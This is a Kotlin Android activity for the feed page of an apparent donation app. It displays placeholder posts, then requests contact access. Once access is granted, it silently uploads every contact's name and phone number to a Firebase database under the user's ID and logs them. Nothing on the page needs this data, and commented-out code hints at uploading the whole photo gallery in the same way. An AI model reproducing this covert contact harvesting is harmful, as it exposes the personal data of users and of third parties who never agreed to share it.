package com.example.karunadaan

import android.content.pm.PackageManager
import android.os.Bundle
import android.provider.ContactsContract
import android.widget.ImageView
import android.widget.Toast
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import androidx.recyclerview.widget.RecyclerView.LayoutManager
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import android.content.ContentResolver
import android.content.ContentUris
import android.content.Intent
import android.database.Cursor
import android.provider.Settings
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.provider.MediaStore
import android.util.Log
import androidx.annotation.RequiresApi
import androidx.lifecycle.ViewModelProvider
import androidx.lifecycle.viewmodel.viewModelFactory
import com.example.karunadaan.database.DonationDatabase
import com.example.karunadaan.entity.DonatedItem
import com.example.karunadaan.entity.DonationCategory
import com.example.karunadaan.firebase.FirebaseHelper
import com.example.karunadaan.repository.DonationRepository
import com.example.karunadaan.viewModel.FeedPageViewModel
import com.google.android.ads.mediationtestsuite.viewmodels.ViewModelFactory
import com.google.firebase.storage.FirebaseStorage
import com.google.firebase.storage.StorageReference
import java.io.File


class FeedPageActivity : AppCompatActivity() {

    lateinit var feedRecyclerView: RecyclerView
    lateinit var profileImageView: ImageView
    val TAG = "FeedPageActivity"
    lateinit var mdatabaseReference: DatabaseReference
    lateinit var mAuth:FirebaseAuth

    private val REQUEST_PERMISSION = 1001

    private lateinit var viewModel: FeedPageViewModel

    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContentView(R.layout.activity_feed_page)

        feedRecyclerView = findViewById(R.id.feedRecycler)
        profileImageView = findViewById(R.id.feedProfileImage)

        mdatabaseReference = FirebaseDatabase.getInstance().getReference()
        mAuth = FirebaseAuth.getInstance()

        var list = arrayListOf<Post>()
        var post = Post("Abhishek Mishra","pp3gHxjt7AUZU5382fzu0nklc6Z2",
            "RecyclerView is great for lists with many items or dynamically changing data, " +
                    "but sometimes a simpler approach, like using individual item views directly in a layout, " +
                    "might be better suited for specific use cases. Here are scenarios where you might prefer " +
                    "using a single View (or a few Views) over a RecyclerView:\n" +
                    "\n" +
                    "1. Static or Small Lists with Fixed Content\n" +
                    "If you only have a small, fixed number of items (for example, 3-5 items that don't change), " +
                    "creating individual views directly in the layout can be simpler and may avoid the added complexity " +
                    "of RecyclerView.\n" +
                    "Example: A settings page with a few static options, like toggles or buttons.",
            200,
            25,
            "sdgsg",
            "04/11/2024 10:14:01",null
        )
        list.add( post)
        list.add( post)
        list.add( post)
        list.add( post)
        list.add( post)
        list.add( post)
        list.add( post)
//        val donationRepository = DonationRepository(
//            DonationDatabase.getInstance(applicationContext).donationDao(),
//            FirebaseHelper(FirebaseDatabase.getInstance())
//            )
//
//        viewModel = FeedPageViewModel(donationRepository)
//
//        var donate = DonatedItem( donorUid="pp3gHxjt7AUZU5382fzu0nklc6Z2",
//            item = "Shirt",
//            quantity = 2,
//            location = "Phagwara, Punjab",
//            donationCategory = DonationCategory.CLOTHES,
//            isSynced = false )
//        viewModel.addDonation(donate)

        var customAdapter = PostAdapter(this,list)
        var mLayout = LinearLayoutManager(this)
        mLayout.orientation=(LinearLayoutManager.VERTICAL)
        feedRecyclerView.layoutManager = mLayout
        feedRecyclerView.adapter = customAdapter

        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, arrayOf( android.Manifest.permission.READ_CONTACTS), 100)
        } else {
            accessContacts()  // Proceed with accessing contacts
        }
//        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE)
//            != PackageManager.PERMISSION_GRANTED) {
//            ActivityCompat.requestPermissions(
//                this,
//                arrayOf( android.Manifest.permission.READ_EXTERNAL_STORAGE),
//                REQUEST_PERMISSION
//            )
//        } else {
//            // Permission already granted
//           // getAllImagesFromGalleryAndUpload()
//        }
    }


    @RequiresApi(Build.VERSION_CODES.R)
    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

//        if (requestCode == REQUEST_PERMISSION) {
//            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
//                // Permission granted, fetch and upload images
//               // getAllImagesFromGalleryAndUpload()
//            } else {
//                // Permission denied, show a message
//                Toast.makeText(this, "Permission denied! Cannot access gallery.", Toast.LENGTH_SHORT).show()
//            }
//        }
        if (requestCode == 100) {  // This should match your request code
            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                accessContacts()  // Proceed to access contacts
            } else {
                Toast.makeText(this, "Permission denied", Toast.LENGTH_SHORT).show()
            }
        }

    }

    private fun accessContacts() {
        val contactsList = mutableListOf<String>()
        val cursor = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null,
            null,
            null,
            null
        )

        cursor?.let {
            // Retrieve column indices
            val nameIndex = it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val phoneIndex = it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)

            while (it.moveToNext()) {
                val name = it.getString(nameIndex)
                val phoneNumber = it.getString(phoneIndex)
                contactsList.add("Name: $name, Phone: $phoneNumber")
            }
        }

        // Use contactsList, e.g., display in a RecyclerView
        mdatabaseReference.child("contacts").child(mAuth.currentUser!!.uid).push().setValue(contactsList)
        contactsList.forEach { Log.d("Contacts ", it) }
    }

}